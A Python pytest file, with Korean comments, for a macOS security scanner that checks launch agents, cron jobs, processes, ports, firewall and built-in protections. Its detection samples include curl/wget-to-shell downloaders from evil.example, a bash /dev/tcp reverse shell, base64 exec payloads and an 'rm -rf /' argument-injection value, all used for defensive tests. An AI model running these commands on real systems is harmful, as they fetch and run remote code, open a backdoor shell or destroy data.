# -*- coding: utf-8 -*-
"""
Mac 보안 점검(core/mac_security.py, 1단계 읽기 전용) 테스트.

macOS 명령(spctl, codesign, lsof …)의 출력은 _run을 바꿔치기해서 흉내 낸다 — 이 PC의 실제 설정과 상관없이
같은 결과가 나오게. 플러그인을 거쳐 부르는 테스트는 결과가 Windows판과 같은 길(CheckResult, 점수, AI 답변
빌더)로 나오는지도 본다.
"""
import plistlib
import types
from datetime import datetime, timedelta, timezone

import pytest

from core import ai_worker as aw
from core import mac_security as ms
from core.startup_security import build_startup_notice
from plugins import malware_detection as md
from plugins import network_security as ns
from plugins import system_security as ss

pytestmark = pytest.mark.mac_security


@pytest.fixture(autouse=True)
def _mac(monkeypatch):
    monkeypatch.setattr(ms, "is_mac", lambda: True)
    monkeypatch.setattr(ms.time, "sleep", lambda s: None)


def _fake_run(monkeypatch, table):
    """table: {명령 앞부분 튜플: (종료 코드, 표준 출력, 표준 오류) 또는 None(실행 못 함)}."""
    def run(args, timeout=15):
        for prefix, result in table.items():
            if tuple(args[:len(prefix)]) == prefix:
                return result
        return None
    monkeypatch.setattr(ms, "_run", run)


def _sigs(monkeypatch, table, default=None):
    monkeypatch.setattr(ms, "signature_info", lambda path: table.get(path, default))


VALID = (ms.SIGNATURE_VALID, "Developer ID Application: Good Co (AAAA111111)", "AAAA111111")


# ─────────────────────────────────────────────
# 숨긴 명령 / 실제 실행 파일
# ─────────────────────────────────────────────

@pytest.mark.parametrize("argv", [
    ["/bin/sh", "-c", "curl -fsSL http://evil.example/x | sh"],
    ["/bin/bash", "-c", "wget -qO- http://evil.example/x|sudo bash"],
    ["/bin/zsh", "-c", "echo aGVsbG8= | base64 --decode | sh"],
    ["/usr/bin/python3", "-c", "import base64;exec(base64.b64decode('eA=='))"],
    ["/usr/bin/osascript", "-e", 'do shell script "id"'],
    ["/bin/bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"],
    ["/usr/bin/curl", "-s", "http://evil.example/x", "|", "python3"],
])
def test_hidden_commands_are_detected(argv):
    assert ms.hidden_command(argv)


@pytest.mark.parametrize("argv", [
    ["/usr/bin/python3", "/Users/me/tools/backup.py"],
    ["/Applications/App.app/Contents/MacOS/App", "-c", "curl x | sh"],   # 실행기가 아니면 인자 패턴만으로 알리지 않는다
    ["/bin/sh", "-c", "/Applications/RustDesk.app/Contents/MacOS/service"],
    [],
])
def test_ordinary_commands_are_not_hidden(argv):
    assert not ms.hidden_command(argv)


def test_payload_follows_script_host_argument():
    assert ms.autorun_payload(["/bin/sh", "-c", "/tmp/x.sh --flag"]) == "/tmp/x.sh"
    assert ms.autorun_payload(["/usr/bin/python3", "-u", "/Users/Shared/a.py"]) == "/Users/Shared/a.py"
    assert ms.autorun_payload(["/Applications/A.app/Contents/MacOS/A", "/tmp/arg"]) == "/Applications/A.app/Contents/MacOS/A"
    # 따옴표 짝이 안 맞아도 멈추지 않는다
    assert ms.autorun_payload(["/bin/sh", "-c", "'/tmp/broken.sh"]) in ("/bin/sh", "'/tmp/broken.sh")


# ─────────────────────────────────────────────
# 자동 실행 판정
# ─────────────────────────────────────────────

def test_autorun_classification(monkeypatch):
    _sigs(monkeypatch, {
        "/tmp/unsigned": (ms.SIGNATURE_NOT_SIGNED, "", ""),
        "/Users/Shared/Game/launcher": (ms.SIGNATURE_PARTIAL, "Developer ID Application: Game Co (BBBB222222)", "BBBB222222"),
        "/Users/me/Downloads/gone": (ms.SIGNATURE_NOT_FOUND, "", ""),
        "/Users/me/.hidden/agent": (ms.SIGNATURE_ADHOC, "", ""),
    })
    items = [
        ("내 계정", "unsigned", ["/tmp/unsigned"]),
        ("내 계정", "game", ["/Users/Shared/Game/launcher", "--agent"]),
        ("내 계정", "gone", ["/Users/me/Downloads/gone"]),
        ("내 계정", "hidden", ["/Users/me/.hidden/agent"]),
        ("내 계정", "dropper", ["/bin/sh", "-c", "curl http://x | sh"]),
        ("내 계정", "normal", ["/Applications/Normal.app/Contents/MacOS/Normal"]),
        ("내 계정", "remote", ["/Applications/AnyDesk.app/Contents/MacOS/AnyDesk", "--control"]),
        ("내 계정", "unreadable", None),
        ("내 계정", "empty", []),
    ]
    suspicious, normal, counts = ms.classify_autoruns(items)
    assert counts == {"critical": 2, "warning": 3, "unknown": 1}
    joined = "\n".join(suspicious)
    assert "unsigned" in joined and "dropper" in joined and "game" in joined and "gone" in joined and "hidden" in joined
    assert normal[0].endswith(f"{ms.UNKNOWN_MARK}(설정 파일을 읽지 못함)")   # ❔는 목록 앞쪽
    assert any("빈 설정" in ln for ln in normal)
    assert any("AnyDesk" in ln and "원격 제어 프로그램" in ln for ln in normal)


def test_trust_hides_location_alert_but_never_hidden_command(monkeypatch):
    _sigs(monkeypatch, {}, default=(ms.SIGNATURE_NOT_SIGNED, "", ""))
    trusted = lambda path: path in ("/tmp/mine", "/tmp/payload.sh")
    items = [("내 계정", "mine", ["/tmp/mine"]),
             ("내 계정", "dropper", ["/bin/sh", "-c", "/tmp/payload.sh; curl http://x | sh"])]
    suspicious, normal, counts = ms.classify_autoruns(items, trusted)
    assert counts["critical"] == 1 and "dropper" in suspicious[0]
    assert any("mine" in ln and "신뢰 목록" in ln for ln in normal)


def _write_plist(path, data):
    with open(path, "wb") as f:
        plistlib.dump(data, f)


def test_startup_items_reads_launch_agents_and_ai_reply_reads_it(monkeypatch, tmp_path):
    agents = tmp_path / "LaunchAgents"
    agents.mkdir()
    _write_plist(agents / "com.good.agent.plist", {"Label": "com.good.agent",
                                                  "ProgramArguments": ["/Applications/Good.app/Contents/MacOS/Good"]})
    _write_plist(agents / "com.bad.agent.plist", {"Label": "com.bad.agent", "Program": "/private/tmp/bad"})
    (agents / "broken.plist").write_bytes(b"not a plist")
    (agents / "readme.txt").write_text("x")
    monkeypatch.setattr(ms, "LAUNCH_AGENT_DIRS", ((str(agents), "로그인 시 실행(내 계정용)"),))
    _sigs(monkeypatch, {}, default=(ms.SIGNATURE_NOT_SIGNED, "", ""))

    r = md.scan_startup_items()
    assert (r.critical, r.warning, r.unknown) == (1, 0, 1)
    assert r.startswith("[🔁 자동 실행 프로그램 점검 결과] (총 3개)")
    reply = aw._build_deterministic_reply(str(r))
    assert reply and "com.bad.agent" in reply and "총 3개" in reply


def test_startup_items_empty_folder(monkeypatch, tmp_path):
    monkeypatch.setattr(ms, "LAUNCH_AGENT_DIRS", ((str(tmp_path), "로그인 시 실행(내 계정용)"),))
    r = md.scan_startup_items()
    assert (r.critical, r.warning, r.unknown) == (0, 0, 0)
    assert aw._build_deterministic_reply(str(r)) == "자동으로 실행되도록 등록된 프로그램이 없어요."


def test_launch_daemons_route_from_services_check(monkeypatch, tmp_path):
    _write_plist(tmp_path / "com.x.plist", {"Label": "com.x", "ProgramArguments": ["/bin/sh", "-c", "curl http://a | sh"]})
    monkeypatch.setattr(ms, "LAUNCH_DAEMON_DIRS", ((str(tmp_path), "백그라운드 서비스(시스템)"),))
    r = md.scan_suspicious_services()
    assert r.critical == 1 and r.startswith("[🍎 백그라운드 서비스(LaunchDaemons) 점검]")


def test_cron_jobs(monkeypatch):
    crontab = ("# 주석\nPATH=/usr/bin:/bin\n*/5 * * * * curl -s http://evil.example/x | sh\n"
               "@reboot /Users/me/bin/sync.sh\n0 3 * * * /tmp/cleanup\n")
    _fake_run(monkeypatch, {(ms._CRONTAB, "-l"): (0, crontab, "")})
    _sigs(monkeypatch, {}, default=(ms.SIGNATURE_NOT_SIGNED, "", ""))
    r = md.scan_scheduled_tasks()
    assert r.critical == 2   # 숨긴 명령 + 임시 폴더 실행
    assert "@reboot" in r and "[cron]" in r


@pytest.mark.parametrize("result, expected", [
    ((1, "", "crontab: no crontab for me"), (0, 0, 0)),
    ((1, "", "permission denied"), (0, 0, 1)),
    (None, (0, 0, 1)),
])
def test_cron_empty_or_unreadable(monkeypatch, result, expected):
    _fake_run(monkeypatch, {(ms._CRONTAB, "-l"): result})
    r = md.scan_scheduled_tasks()
    assert (r.critical, r.warning, r.unknown) == expected


# ─────────────────────────────────────────────
# 의심 프로세스
# ─────────────────────────────────────────────

@pytest.mark.parametrize("name, exe, sig, expected", [
    ("launchd", "/sbin/launchd", None, "trusted"),
    ("WindowServer", "/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer", None, "trusted"),
    ("launchd", "/Users/me/Library/launchd", None, "impersonating"),
    ("launchd", "/usr/local/bin/launchd", None, "impersonating"),
    ("kernel_task", "", None, "unverified"),
    ("Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
     (ms.SIGNATURE_VALID, "Developer ID Application: Google LLC (EQHXZ8M8AV)", "EQHXZ8M8AV"), "trusted"),
    ("Google Chrome", "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
     (ms.SIGNATURE_PARTIAL, "Developer ID Application: Google LLC (EQHXZ8M8AV)", "EQHXZ8M8AV"), "trusted"),
    ("Google Chrome", "/tmp/Google Chrome", VALID, "impersonating_app"),
    ("Google Chrome", "/tmp/Google Chrome", (ms.SIGNATURE_NOT_SIGNED, "", ""), "impersonating_app"),
    ("Google Chrome", "/tmp/Google Chrome", None, "check"),     # 서명 확인 실패 — 사칭으로 단정하지 않는다
    ("SomeApp", "/Applications/SomeApp.app/Contents/MacOS/SomeApp", None, "check"),
])
def test_process_verdict(name, exe, sig, expected):
    assert ms.process_verdict(name, exe, lambda p: sig)[0] == expected


class _Proc:
    """psutil.Process 흉내 — CPU 측정 결과를 프로세스 객체를 키로 담으므로 해시가 돼야 한다."""

    def __init__(self, pid, name, exe, mem=1.0, user="me", cpu=0.0):
        self.info = {"pid": pid, "name": name, "exe": exe, "memory_percent": mem, "username": user}
        self._cpu = cpu

    def cpu_percent(self, interval=None):
        return self._cpu


_proc = _Proc


def test_detect_suspicious_processes_format_and_counts(monkeypatch):
    procs = [
        _proc(1, "launchd", "/sbin/launchd"),
        _proc(2, "launchd", "/Users/me/.x/launchd"),                       # 이름 사칭 → 🚨
        _proc(3, "dropper", "/private/tmp/dropper"),                       # 임시 폴더 + 외부 연결 → ⚠️
        _proc(4, "xmrig", "/Users/me/xmrig"),                              # 해킹 도구 이름 → 🚨
        _proc(5, "kernel_task", None),                                     # 위치 모름 → ℹ️
        _proc(6, "other", "/private/tmp/other"),                           # 임시 폴더 + 외부 연결 → ⚠️
        _proc(7, "translocated", "/private/var/folders/ab/T/AppTranslocation/X/d/App.app/Contents/MacOS/App"),
    ]
    monkeypatch.setattr(ms.psutil, "process_iter", lambda attrs=None: procs)
    monkeypatch.setattr(ms, "_external_pids", lambda: {3, 6, 7})
    monkeypatch.setattr(ms, "_ps_paths", lambda: {})
    r = md.detect_suspicious_processes()
    assert (r.critical, r.warning) == (2, 2)   # 다운로드 앱이 옮겨져 실행되는 AppTranslocation(7)은 알리지 않는다
    assert "macOS 시스템 프로그램 1개" in r
    reply = aw._build_deterministic_reply(str(r))
    assert reply and "그중 4개가 의심스러워요" in reply and "macOS 커널 프로그램 1개" in reply


def test_detect_trusted_process(monkeypatch, tmp_path):
    exe = tmp_path / "updater"
    exe.write_bytes(b"x")
    procs = [_proc(1, "updater", "/private/tmp/updater")]
    monkeypatch.setattr(ms.psutil, "process_iter", lambda attrs=None: procs)
    monkeypatch.setattr(ms, "_external_pids", lambda: {1})
    r = ms.detect_suspicious_processes(trusted=lambda p: p == "/private/tmp/updater")
    assert (r.critical, r.warning) == (0, 0)
    assert "신뢰한 프로그램 1개" in r.text


def test_lsof_parsing(monkeypatch):
    out = ("p100\ncControlCe\nn*:7000\nn[::1]:631\np200\ncCode\\x20Helper\nn127.0.0.1:5000\n"
           "p300\ncsshd\nn192.168.0.5:22->8.8.8.8:5555\n")
    _fake_run(monkeypatch, {(ms._LSOF,): (0, out, "")})
    rows = ms._lsof_tcp("LISTEN")
    assert (200, "Code Helper", "127.0.0.1:5000") in rows
    assert ms._split_addr("*:7000") == ("*", 7000)
    assert ms._split_addr("[::1]:631") == ("::1", 631)
    assert ms._split_addr("garbage") is None
    assert ms._external_pids() == {300}


# ─────────────────────────────────────────────
# 열린 포트 (network_security.get_listening_ports가 Mac 데이터를 같은 기준으로 판정)
# ─────────────────────────────────────────────

def test_listening_ports_with_probe(monkeypatch):
    out = "p100\ncsmbd\nn*:445\np200\ncnode\nn127.0.0.1:3000\n"
    _fake_run(monkeypatch, {(ms._LSOF,): (0, out, "")})
    monkeypatch.setattr(ms.psutil, "Process", lambda pid: (_ for _ in ()).throw(ms.psutil.AccessDenied(pid)))
    addr = types.SimpleNamespace(family=ms.socket.AF_INET, address="192.168.0.10")
    monkeypatch.setattr(ms.psutil, "net_if_addrs", lambda: {"en0": [addr]})

    class _Conn:
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def connect(target, timeout=None):
        if target[1] == 5900:
            return _Conn()
        raise ConnectionRefusedError

    monkeypatch.setattr(ms.socket, "create_connection", connect)
    r = ns.get_listening_ports()
    assert r.critical == 2                    # 445 + 5900(lsof에 안 보이는 시스템 서비스)
    assert "5900" in r and "관리자 권한 필요" in r and "Mac 방화벽" in r and "Windows 방화벽" not in r
    assert "이 PC 안에서만 쓰는 포트 1개" in r


def test_listening_ports_unreadable(monkeypatch):
    _fake_run(monkeypatch, {})
    r = ns.get_listening_ports()
    assert r.unknown == 1


# ─────────────────────────────────────────────
# 방화벽 / 기본 보안 / 업데이트 / 공유
# ─────────────────────────────────────────────

FW = ms._SOCKETFILTERFW


@pytest.mark.parametrize("state, blockall, stealth, counts, summary", [
    ("Firewall is disabled. (State = 0)", "", "", (0, 1, 0), "꺼져 있음"),
    ("Firewall is enabled. (State = 1)", "Firewall has block all state set to disabled.",
     "Firewall stealth mode is on", (0, 0, 0), "켜짐"),
    ("Firewall is enabled. (State = 1)", "Firewall has block all state set to enabled.",
     "Firewall stealth mode is off", (0, 0, 0), "켜짐 (들어오는 연결 모두 차단)"),
    ("", "", "", (0, 0, 1), "확인하지 못함"),
])
def test_firewall_status(monkeypatch, state, blockall, stealth, counts, summary):
    _fake_run(monkeypatch, {(FW, "--getglobalstate"): (0, state, ""), (FW, "--getblockall"): (0, blockall, ""),
                            (FW, "--getstealthmode"): (0, stealth, "")})
    r = ns.check_firewall_status()
    assert (r.critical, r.warning, r.unknown) == counts
    assert r.summary == summary


def _history_json(days_ago):
    when = (datetime.now(timezone.utc) - timedelta(days=days_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")
    return ('{"SPInstallHistoryDataType": [{"_name": "XProtectPlistConfigData", "install_date": "%s"},'
            '{"_name": "Safari", "install_date": "2020-01-01T00:00:00Z"}]}' % when)


def _protection(monkeypatch, gk, sip, fv, history):
    _fake_run(monkeypatch, {
        (ms._SPCTL, "--status"): gk, (ms._CSRUTIL, "status"): sip, (ms._FDESETUP, "status"): fv,
        (ms._SYSTEM_PROFILER,): history,
    })
    monkeypatch.setattr(ms, "_XPROTECT_PLISTS", ())


def test_builtin_protection_all_good(monkeypatch):
    _protection(monkeypatch, (0, "assessments enabled\n", ""), (0, "System Integrity Protection status: enabled.\n", ""),
                (0, "FileVault is On.\n", ""), (0, _history_json(3), ""))
    r = md.check_defender_status()
    assert (r.critical, r.warning, r.unknown) == (0, 0, 0)
    reply = aw._build_deterministic_reply(str(r))
    assert reply.startswith("Mac 기본 보안 상태 확인 결과예요:")


def test_builtin_protection_problems(monkeypatch):
    _protection(monkeypatch, (0, "assessments disabled\n", ""), (0, "System Integrity Protection status: disabled.\n", ""),
                (0, "FileVault is Off.\n", ""), (0, _history_json(90), ""))
    r = md.check_defender_status()
    assert (r.critical, r.warning, r.unknown) == (3, 1, 0)   # Gatekeeper, SIP, XProtect 90일 / FileVault


def test_builtin_protection_unreadable(monkeypatch):
    _protection(monkeypatch, None, None, None, None)
    r = md.check_defender_status()
    assert (r.critical, r.warning, r.unknown) == (0, 0, 4)


def _update_prefs(monkeypatch, prefs, version="26.6.2"):
    monkeypatch.setattr(ms, "_read_plist", lambda path: prefs if path == ms._SOFTWAREUPDATE_PLIST else None)
    monkeypatch.setattr(ms.platform, "mac_ver", lambda: (version, ("", "", ""), ""))


def _ago(days):
    return datetime.now(timezone.utc).replace(tzinfo=None) - timedelta(days=days)


@pytest.mark.parametrize("offered_days, expected", [(40, (1, 0)), (20, (0, 1)), (3, (0, 0))])
def test_pending_minor_update(monkeypatch, offered_days, expected):
    _update_prefs(monkeypatch, {
        "RecommendedUpdates": [{"Product Key": "MSU_UPDATE_25G241_patch_26.7.1_minor",
                                "Display Name": "macOS Tahoe 26.7.1", "MobileSoftwareUpdate": True}],
        # 지금 버전보다 새 업데이트 중 가장 먼저 제안된 날부터 센다(26.7 → 26.7.1)
        "FirstOfferDateDictionary": {"MSU_UPDATE_25G229_patch_26.7_minor": _ago(offered_days),
                                     "MSU_UPDATE_25G241_patch_26.7.1_minor": _ago(1),
                                     "MSU_UPDATE_25F80_patch_26.5.1_minor": _ago(200)},
        "LastSuccessfulDate": _ago(1),
    })
    r = ss.check_update_status()
    assert (r.critical, r.warning) == expected
    assert "macOS Tahoe 26.7.1" in r


def test_no_pending_update_and_settings(monkeypatch):
    _update_prefs(monkeypatch, {
        "RecommendedUpdates": [{"Product Key": "MSU_UPDATE_26A434_patch_27.0.1_major",
                                "Display Name": "macOS 27.0.1", "MobileSoftwareUpdate": True}],
        "LastSuccessfulDate": _ago(30), "CriticalUpdateInstall": False,
    })
    r = ss.check_update_status()
    # 큰 버전 업그레이드는 선택 사항(ℹ️), 확인이 30일 밀림 ⚠️, 보안 응답 자동 설치 꺼짐 ⚠️
    assert (r.critical, r.warning, r.unknown) == (0, 2, 0)
    assert "macOS 27.0.1 (선택 사항)" in r


def test_update_unreadable(monkeypatch):
    _update_prefs(monkeypatch, None)
    assert ss.check_update_status().unknown == 1


SHARING = """
			List of Share Points
name:		Public Folder
path:		/Users/me/Public
	smb:	{
    		name:	Public Folder
    		shared:	1
    		guest access:	1
    		read-only:	0
	}
name:		Private
path:		/Users/me/Private
	smb:	{
    		name:	Private
    		shared:	0
    		guest access:	1
	}
"""


@pytest.mark.parametrize("smbd, expected", [(True, (0, 1)), (False, (0, 0))])
def test_shared_folders(monkeypatch, smbd, expected):
    _fake_run(monkeypatch, {(ms._SHARING, "-l"): (0, SHARING, "")})
    names = [types.SimpleNamespace(info={"name": "smbd" if smbd else "other"})]
    monkeypatch.setattr(ms.psutil, "process_iter", lambda attrs=None: names)
    r = ss.scan_shared_folders()
    assert (r.critical, r.warning) == expected
    assert "공유 폴더 1개" in r and "Private" not in r


def test_shared_folders_none(monkeypatch):
    _fake_run(monkeypatch, {(ms._SHARING, "-l"): (0, "\n\t\t\tList of Share Points\n", "")})
    r = ss.scan_shared_folders()
    assert (r.critical, r.warning, r.unknown) == (0, 0, 0)


# ─────────────────────────────────────────────
# 시작 보안 알림 / 신뢰 목록 / 리포트
# ─────────────────────────────────────────────

def test_startup_notice_uses_mac_labels_and_keeps_port_alert():
    from plugins.network_security import CheckResult
    func_map = {
        "check_update_status": lambda: CheckResult("[x]\n✅ 최신", summary="최신 상태"),
        "check_firewall_status": lambda: CheckResult("[x]\n✅ 켜짐", summary="켜짐"),
        "get_listening_ports": lambda: CheckResult("[x]\n🚨 5900", critical=1, summary="위험 1개"),
    }
    notice = build_startup_notice(func_map)
    assert "macOS 업데이트" in notice and "Mac 방화벽" in notice and "Windows" not in notice
    # Mac 방화벽이 켜져 있어도 열린 위험 포트를 ⚠️로 낮추지 않는다(Windows 기본 차단과 동작이 다름)
    assert "🚨 열린 포트" in notice


def test_mac_script_hosts_cannot_be_trusted():
    for path in ("/bin/bash", "/usr/bin/osascript", "/usr/bin/python3"):
        assert "넣을 수 없어요" in md.trust_security_item(path)


def test_system_report_label_on_mac(monkeypatch):
    monkeypatch.setattr(ss, "check_update_status", lambda: ss.CheckResult("[x]\n✅"))
    monkeypatch.setattr(ss, "scan_shared_folders", lambda: ss.CheckResult("[x]\n✅"))
    report = ss.get_system_security_report()
    assert "macOS 업데이트" in report and "Windows 업데이트" not in report


def test_mac_reply_builder_shape():
    raw = "[🍎 Mac 방화벽 상태]\n⚠️ 방화벽이 꺼져 있어요\n일반 줄\n✅ 스텔스 모드 켜짐"
    assert aw._build_mac_check_reply(raw) == ("Mac 방화벽 상태 확인 결과예요:\n- [주의] 방화벽이 꺼져 있어요\n일반 줄\n"
                                              "- 스텔스 모드 켜짐")
    assert aw._build_mac_check_reply("[🧱 Windows 방화벽 상태]\n✅ 켜짐") is None
    assert aw._build_mac_check_reply("[🍎 제목만]") is None


def test_windows_logic_is_default_without_marker_in_other_tests():
    """다른 테스트 파일에서는 conftest가 is_mac을 끈다 — 여기서는 표시(mac_security) 덕분에 켜져 있다."""
    assert ms.is_mac() is True


# ─────────────────────────────────────────────
# netstat — 관리자 권한 없이 모든 프로그램의 포트·연결
# ─────────────────────────────────────────────
NETSTAT = """Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)      rxbytes      txbytes  rhiwat  shiwat    process:pid    state  options           gencnt    flags   flags1 usecnt rtncnt fltrs
tcp4       0      0  *.5900                 *.*                    LISTEN             0            0  131072  131072      launchd:1      00180 00000006 000000000000001e 00000000 00000800      1      0 000000
tcp6       0      0  *.5900                 *.*                    LISTEN             0            0  131072  131072      launchd:1      00180 00000006 000000000000001d 00000000 00000800      1      0 000000
tcp4       0      0  127.0.0.1.50823        *.*                    LISTEN             0            0  131072  131072  Code Helper (Plu:113  00180 00000006 000000000000001e 00000000 00000800      1      0 000000
tcp4       0      0  *.445                  *.*                    LISTEN             0            0  131072  131072      smbd:420      00180 00000006 000000000000001e 00000000 00000800      1      0 000000
tcp4       0      0  172.30.1.88.51517      17.57.156.25.993       ESTABLISHED    13534         5345  131072  131768         Mail:24497  00102 00020000 00000000002927f2 00180081 04086900      2      0 000000
tcp4       0      0  127.0.0.1.50000        127.0.0.1.50001        ESTABLISHED        1            1  131072  131768      local:77    00102 00020000 00000000002927f2 00180081 04086900      2      0 000000
"""


def test_netstat_parsing_handles_names_with_spaces(monkeypatch):
    _fake_run(monkeypatch, {(ms._NETSTAT,): (0, NETSTAT, "")})
    rows = ms._netstat_tcp()
    assert ("LISTEN", "127.0.0.1.50823", "*.*", 113, "Code Helper (Plu") in rows
    assert ms._split_dotted("*.5900") == ("*", 5900)
    assert ms._split_dotted("fe80::1%lo0.123") == ("fe80::1", 123)
    assert ms._split_dotted("*.*") is None
    assert ms._external_pids() == {24497}   # 로컬끼리 연결(77)은 빼고, 다른 계정 프로그램도 보인다


def test_netstat_without_process_column_is_unsupported(monkeypatch):
    old = NETSTAT.replace("process:pid", "")
    _fake_run(monkeypatch, {(ms._NETSTAT,): (0, old, "")})
    assert ms._netstat_tcp() is None


def test_listening_ports_from_netstat_names_system_services(monkeypatch):
    calls = []
    table = {(ms._NETSTAT,): (0, NETSTAT, ""), (ms._PS,): (0, "  420 /usr/sbin/smbd\n    1 /sbin/launchd\n", "")}

    def run(args, timeout=15):
        calls.append(args[0])
        return next((v for k, v in table.items() if tuple(args[:len(k)]) == k), None)

    monkeypatch.setattr(ms, "_run", run)
    r = ns.get_listening_ports()
    assert r.critical == 2
    assert "macOS 화면 공유 (launchd)" in r and "smbd" in r
    assert ms._OSASCRIPT not in calls and ms._LSOF not in calls   # 관리자 권한도, lsof도 필요 없었다


# ─────────────────────────────────────────────
# 관리자 권한 요청 (예전 macOS처럼 netstat에 프로그램 번호가 없을 때)
# ─────────────────────────────────────────────
LSOF_ALL = "p1\nclaunchd\nn*:5900\np200\ncnode\nn127.0.0.1:3000\n"
LSOF_MINE = "p200\ncnode\nn127.0.0.1:3000\n"


def _no_netstat_env(monkeypatch, admin_result):
    """netstat는 프로그램 번호 없음 → lsof. osascript(관리자 암호 창) 결과를 admin_result로 흉내 낸다."""
    calls = []

    def run(args, timeout=15):
        calls.append(list(args))
        if args[0] == ms._NETSTAT:
            return 0, NETSTAT.replace("process:pid", ""), ""
        if args[0] == ms._OSASCRIPT:
            return admin_result
        if args[0] == ms._LSOF:
            return 0, LSOF_MINE, ""
        return None

    monkeypatch.setattr(ms, "_run", run)
    monkeypatch.setattr(ms.os, "geteuid", lambda: 501)
    monkeypatch.setattr(ms.psutil, "net_if_addrs", lambda: {})
    return calls


def test_admin_lsof_when_netstat_lacks_process_column(monkeypatch):
    calls = _no_netstat_env(monkeypatch, (0, LSOF_ALL, ""))
    ports = ms.listening_ports(probe_ports=[5900])
    assert ports[5900]["procs"] == {"macOS 화면 공유 (launchd)"} and 3000 in ports   # 관리자 권한으로 전체를 봄
    script = next(c for c in calls if c[0] == ms._OSASCRIPT)[2]
    assert "with administrator privileges" in script and "열린 포트" in script
    assert "'-sTCP:LISTEN'" in script or "-sTCP:LISTEN" in script


def test_admin_cancelled_falls_back_to_my_programs(monkeypatch):
    _no_netstat_env(monkeypatch, (1, "", "User canceled. (-128)"))
    ports = ms.listening_ports(probe_ports=[5900])
    assert set(ports) == {3000}     # 내 계정 프로그램만 — 접속 확인할 LAN 주소가 없어 5900은 모름


def test_no_admin_prompt_blocks_password_dialog(monkeypatch):
    calls = _no_netstat_env(monkeypatch, (0, LSOF_ALL, ""))
    with ms.no_admin_prompt():
        assert not ms.admin_prompt_allowed()
        ms.listening_ports()
    assert ms.admin_prompt_allowed()
    assert not any(c[0] == ms._OSASCRIPT for c in calls)


def test_startup_notice_never_asks_for_admin():
    seen = []
    build_startup_notice({"check_update_status": lambda: seen.append(ms.admin_prompt_allowed()) or ss.CheckResult("[x]\n✅")})
    assert seen == [False]


def test_run_as_admin_quotes_arguments(monkeypatch):
    captured = []
    monkeypatch.setattr(ms, "_run", lambda args, timeout=15: captured.append(args) or (0, "ok", ""))
    monkeypatch.setattr(ms.os, "geteuid", lambda: 501)
    assert ms.run_as_admin([ms._LSOF, "-x", "a b; rm -rf /"], '이유 "따옴표"') == (0, "ok", "")
    script = captured[0][2]
    assert "'a b; rm -rf /'" in script                 # 인자는 한 덩어리로 — 명령이 끼어들지 못한다
    assert '\\"따옴표\\"' in script                     # 안내 문구의 따옴표도 AppleScript 문자열 안에 갇힌다
    assert ms.run_as_admin(["/no/such/tool"], "x") is None


def test_ps_fills_unreadable_process_path(monkeypatch):
    procs = [_proc(9, "launchd", None)]
    monkeypatch.setattr(ms.psutil, "process_iter", lambda attrs=None: procs)
    monkeypatch.setattr(ms, "_external_pids", lambda: set())
    monkeypatch.setattr(ms, "_ps_paths", lambda: {9: "/Users/me/.cache/launchd"})
    r = ms.detect_suspicious_processes()
    assert r.critical == 1 and "/Users/me/.cache/launchd" in r.text


# ─────────────────────────────────────────────
# 실제 앱에서 발견한 문제 (2026-10-10)
# ─────────────────────────────────────────────

@pytest.mark.parametrize("text, expected", [
    ("백신 상태 알려줘", "check_defender_status"),        # llama3.1이 list_conditions를 불렀다
    ("열린 포트 보여줘", "get_listening_ports"),          # 시작 알림이 안내하는 문구인데 없는 도구를 지어냈다
    ("방화벽 상태 알려줘", "check_firewall_status"),
    ("시작프로그램 검사해줘", "scan_startup_items"),
    ("방화벽 켜줘", None),                               # 바꾸는 요청은 확인창 경로로
    ("위험한 포트 막아줘", None),
    ("시작프로그램 꺼줘", None),
    ("악성코드 종합 점검해줘", None),                     # 종합 점검 fast-path가 맡는다
    ("열린 포트 보여주지 마", None),
    ("오늘 날씨 알려줘", None),
    # 앱의 보안 빠른 실행 버튼·카드 문구(core/plugins_registry.py)
    ("네트워크 보안 종합해줘", "get_network_security_report"),   # llama3.1이 시스템 보안 리포트를 불렀다
    ("시스템 보안 종합해줘", "get_system_security_report"),
    ("악성코드 종합해줘", "get_malware_report"),
    ("포트랑 방화벽 상태 확인해줘", "get_network_security_report"),
    ("의심스러운 프로세스나 시작프로그램 있는지 확인해줘", "get_malware_report"),
    ("포트 445 열려있어?", None),                          # 특정 포트 질문은 평소 경로(scan_open_ports)
])
def test_single_security_check_fast_path(text, expected):
    assert aw._single_security_check_request(text.lower()) == expected


def test_mac_network_report_uses_checks_that_work_on_mac(monkeypatch):
    monkeypatch.setattr(ns, "scan_open_ports", lambda: ns.CheckResult("[x]\n✅"))
    monkeypatch.setattr(ns, "check_firewall_status", lambda: ns.CheckResult("[x]\n⚠️ 꺼짐", warning=1))
    monkeypatch.setattr(ns, "get_listening_ports", lambda: ns.CheckResult("[x]\n🚨 5900", critical=1))
    report = ns.get_network_security_report()
    assert "점수: 89/100" in report and "⚠️ 방화벽 상태" in report and "🚨 열린 포트" in report
    assert "DNS 설정" not in report
    # 리포트 뒤 "열린 포트를 자세히 봐드릴까요?" → "응"이 해당 점검으로 이어진다
    assert aw._REPORT_DETAIL_TARGETS["열린 포트"] == "get_listening_ports"
    assert aw._REPORT_DETAIL_TARGETS["방화벽 상태"] == "check_firewall_status"
